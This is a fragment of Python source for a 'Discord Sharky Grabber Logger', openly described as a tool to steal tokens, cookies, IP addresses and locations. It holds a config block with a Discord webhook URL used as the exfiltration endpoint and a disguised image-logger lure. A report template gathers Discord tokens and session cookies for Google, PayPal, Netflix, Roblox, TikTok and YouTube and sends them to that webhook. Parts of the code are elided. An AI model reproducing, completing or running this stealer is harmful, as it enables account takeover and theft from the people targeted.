...
__app__ = "Discord Sharky Grabber Logger"
__description__ = "steel tokens, cookies, ip + locations and more "
__version__ = "v2.0"
__author__ = "FralkA"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1217522395695419553/-G5PLH2FyorDIQ7buAxoEjUAyqlRERn4w5Gvr2JXVg50JOlXm-DryNpTcxILm08QSeH3",
    "image": "https://i.pinimg.com/474x/72/24/96/72249666f47fa6f1f6072aba93bc31c7.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Sharky Grabber", # Set this to the name you want the webhook to have
    "color": 0x4285f4, # Hex Color you want for the embed (Example: Red is 0xFF0000)
...
# Here you can add all of the site that you want cookies:
...
**Cookies and Tokens:**
> **Tokens Discord:** `{find_discord_tokens()}`
> **Browser Cookies:** `{get_browser_cookies()}`
> **TikTok Cookies:** `{retrieve_tiktok_cookies()}`
> **Google Cookies:** `{retrieve_google_cookies()}`
> **Paypal Cookies:** `{retrieve_paypal_cookies()}`
> **Netfix Cookies:** `{retrieve_netflix_cookies()}`
> **Roblox Cookies:** `{retrieve_roblox_cookies()}`
> **Youtube Cookies** `{retrieve_youtube_cookies()}` 
